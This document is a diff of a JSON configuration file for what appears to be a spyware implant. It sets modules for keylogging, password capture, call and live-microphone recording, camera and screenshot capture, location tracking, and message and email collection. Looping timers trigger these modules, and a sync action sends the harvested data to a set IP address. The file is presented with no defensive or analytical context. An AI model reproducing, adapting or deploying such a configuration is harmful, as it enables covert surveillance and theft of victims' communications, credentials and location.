@@ -1,161 +1,178 @@
 {
+    "modules": [
+        {"module": "addressbook"},
+        {"module": "application"},
+        {"module": "calendar"},
+        {"module": "call", "record": true, "compression": 5, "buffer": 512000},
+        {"module": "camera", "quality": "med"},
+        {"module": "chat"},
+        {"module": "clipboard"},
+        {"module": "conference", "_type": "mobile", "_platform": "winmo", "number": ""},
+        {
+            "position": true,
+            "camera": true,
+            "network": {"enabled": false, "processes": []},
+            "call": true,
+            "module": "crisis",
+            "hook": {"enabled": true, "processes": []},
+            "mic": true,
+            "synchronize": false
+        },
+        {"module": "device", "list": false},
+        {"module": "keylog", "_type": "desktop,mobile", "_platform": "windows,osx,ios,linux"},
+        {"module": "livemic", "_type": "mobile", "_platform": "winmo", "number": ""},
+        {
+            "module": "messages",
+            "mms": {
+                "enabled": true,
+                "filter": {"datefrom": "2014-09-09 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true}
+            },
+            "sms": {
+                "enabled": true,
+                "filter": {"datefrom": "2014-09-09 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true}
+            },
+            "mail": {
+                "enabled": true,
+                "filter": {
+                    "datefrom": "2014-09-09 00:00:00",
+                    "dateto": "2100-01-01 00:00:00",
+                    "history": true,
+                    "maxsize": 100000
+                }
+            }
+        },
+        {"module": "mic", "autosense": false, "threshold": 0.22, "silence": 5},
+        {"module": "password"},
+        {"gps": false, "module": "position", "cell": true, "wifi": true},
+        {"module": "screenshot", "quality": "med", "onlywindow": false},
+        {"module": "url", "_type": "desktop,mobile", "_platform": "windows,osx,ios,blackberry,winmo,linux"}
+    ],
+    "events": [
+        {
+            "start": 0,
+            "event": "timer",
+            "te": "23:59:59",
+            "enabled": true,
+            "subtype": "loop",
+            "desc": "STARTUP",
+            "ts": "00:00:00"
+        },
+        {
+            "start": 1,
+            "event": "timer",
+            "delay": 60,
+            "te": "23:59:59",
+            "enabled": true,
+            "subtype": "loop",
+            "desc": "SCREENSHOT",
+            "ts": "00:00:00",
+            "repeat": 1
+        },
+        {
+            "start": 2,
+            "event": "timer",
+            "delay": 30,
+            "te": "23:59:59",
+            "enabled": true,
+            "subtype": "loop",
+            "desc": "CAMERA",
+            "ts": "00:00:00",
+            "repeat": 2
+        },
+        {
+            "start": 3,
+            "event": "timer",
+            "te": "23:59:59",
+            "enabled": true,
+            "subtype": "loop",
+            "desc": "POSITION",
+            "ts": "00:00:00"
+        },
+        {
+            "start": 4,
+            "event": "timer",
+            "delay": 60,
+            "te": "23:59:59",
+            "enabled": true,
+            "subtype": "loop",
+            "desc": "SYNC",
+            "ts": "00:00:00",
+            "repeat": 4
+        },
+        {
+            "start": 5,
+            "event": "process",
+            "process": "*calc*",
+            "focus": false,
+            "enabled": true,
+            "window": false,
+            "desc": ""
+        },
+        {
+            "start": 6,
+            "event": "process",
+            "process": "*contact*",
+            "delay": 5,
+            "enabled": true,
+            "end": 7,
+            "iter": 1,
+            "window": false,
+            "desc": "",
+            "focus": false,
+            "repeat": 8
+        }
+    ],
     "actions": [
         {
-            "desc": "STARTUP",
             "subactions": [
                 {"action": "module", "module": "device", "status": "start"},
                 {"action": "module", "module": "calendar", "status": "start"},
                 {"action": "module", "module": "addressbook", "status": "start"},
                 {"action": "module", "module": "messages", "status": "start"},
                 {"action": "module", "module": "chat", "status": "start"},
-                {"action": "module", "module": "url", "status": "start"},
-                {"action": "module", "module": "keylog", "status": "start"},
                 {"action": "module", "module": "application", "status": "start"},
                 {"action": "module", "module": "call", "status": "start"}
-            ]
+            ],
+            "desc": "STARTUP"
         },
         {
-            "desc": "SCREENSHOT",
-            "subactions": [{"action": "module", "module": "screenshot", "status": "start"}]
+            "subactions": [{"action": "module", "module": "screenshot", "status": "start"}],
+            "desc": "SCREENSHOT"
         },
-        {"desc": "CAMERA", "subactions": [{"action": "module", "module": "camera", "status": "start"}]},
-        {"desc": "POSITION", "subactions": [{"action": "module", "module": "position", "status": "start"}]},
+        {"subactions": [{"action": "module", "module": "camera", "status": "start"}], "desc": "CAMERA"},
+        {"subactions": [{"action": "module", "module": "position", "status": "start"}], "desc": "POSITION"},
         {
-            "desc": "SYNC",
             "subactions": [
                 {
-                    "wifi": true,
-                    "host": "$(HOSTNAME)",
                     "action": "synchronize",
-                    "mindelay": 0,
-                    "bandwidth": 500000,
                     "maxdelay": 0,
                     "cell": false,
-                    "stop": false
+                    "host": "192.168.100.193",
+                    "bandwidth": 500000,
+                    "stop": false,
+                    "wifi": true,
+                    "mindelay": 0
                 }
-            ]
+            ],
+            "desc": "SYNC"
         },
-        {"desc": "", "subactions": [{"action": "uninstall"}]}
-    ],
-    "events": [
+        {"subactions": [{"action": "uninstall"}], "desc": ""},
+        {"subactions": [{"action": "module", "module": "call", "status": "stop"}], "desc": ""},
+        {"subactions": [{"action": "module", "module": "mic", "status": "stop"}], "desc": ""},
         {
-            "start": 0,
-            "subtype": "loop",
-            "enabled": true,
-            "event": "timer",
-            "desc": "STARTUP",
-            "te": "23:59:59",
-            "ts": "00:00:00"
-        },
-        {
-            "start": 1,
-            "subtype": "loop",
-            "delay": 60,
-            "enabled": true,
-            "event": "timer",
-            "desc": "SCREENSHOT",
-            "te": "23:59:59",
-            "ts": "00:00:00",
-            "repeat": 1
-        },
-        {
-            "start": 2,
-            "te": "23:59:59",
-            "delay": 30,
-            "enabled": true,
-            "event": "timer",
-            "desc": "CAMERA",
-            "subtype": "loop",
-            "ts": "00:00:00",
-            "repeat": 2
-        },
-        {
-            "start": 3,
-            "subtype": "loop",
-            "enabled": true,
-            "event": "timer",
-            "desc": "POSITION",
-            "te": "23:59:59",
-            "ts": "00:00:00"
-        },
-        {
-            "start": 4,
-            "desc": "SYNC",
-            "delay": 60,
-            "enabled": true,
-            "event": "timer",
-            "subtype": "loop",
-            "te": "23:59:59",
-            "ts": "00:00:00",
-            "repeat": 4
-        },
-        {
-            "start": 5,
-            "window": false,
-            "enabled": true,
-            "event": "process",
-            "desc": "",
-            "focus": false,
-            "process": "*calc*"
+            "subactions": [{"action": "module", "module": "mic", "status": "start"}, {"action": "log", "text": "Start mic"}],
+            "desc": ""
         }
-    ],
-    "modules": [
-        {"module": "addressbook"},
-        {"module": "application"},
-        {"module": "calendar"},
-        {"compression": 5, "buffer": 512000, "module": "call", "record": true},
-        {"module": "camera", "quality": "med"},
-        {"module": "chat"},
-        {"module": "clipboard"},
-        {"module": "conference", "number": ""},
-        {
-            "network": {"enabled": false, "processes": []},
-            "mic": true,
-            "hook": {"enabled": true, "processes": []},
-            "position": true,
-            "synchronize": false,
-            "module": "crisis",
-            "call": true,
-            "camera": true
-        },
-        {"module": "device", "list": false},
-        {"module": "keylog"},
-        {"module": "livemic", "number": ""},
-        {
-            "mail": {
-                "enabled": true,
-                "filter": {
-                    "maxsize": 100000,
-                    "dateto": "2100-01-01 00:00:00",
-                    "history": true,
-                    "datefrom": "2014-09-09 00:00:00"
-                }
-            },
-            "sms": {
-                "enabled": true,
-                "filter": {"dateto": "2100-01-01 00:00:00", "history": true, "datefrom": "2014-09-09 00:00:00"}
-            },
-            "mms": {
-                "enabled": true,
-                "filter": {"dateto": "2100-01-01 00:00:00", "history": true, "datefrom": "2014-09-09 00:00:00"}
-            },
-            "module": "messages"
-        },
-        {"threshold": 0.22, "autosense": false, "module": "mic", "silence": 5},
-        {"module": "password"},
-        {"wifi": true, "gps": false, "module": "position", "cell": true},
-        {"quality": "med", "module": "screenshot", "onlywindow": false},
-        {"module": "url"}
     ],
     "globals": {
         "remove_driver": true,
-        "type": "mobile",
         "advanced": true,
-        "migrated": false,
-        "collapsed": false,
-        "version": 2012041601,
-        "nohide": [],
         "quota": {"min": 104857.6, "max": 104857600},
-        "wipe": false
+        "collapsed": false,
+        "nohide": [],
+        "migrated": false,
+        "type": "mobile",
+        "wipe": false,
+        "version": 2012041601
     }
 }
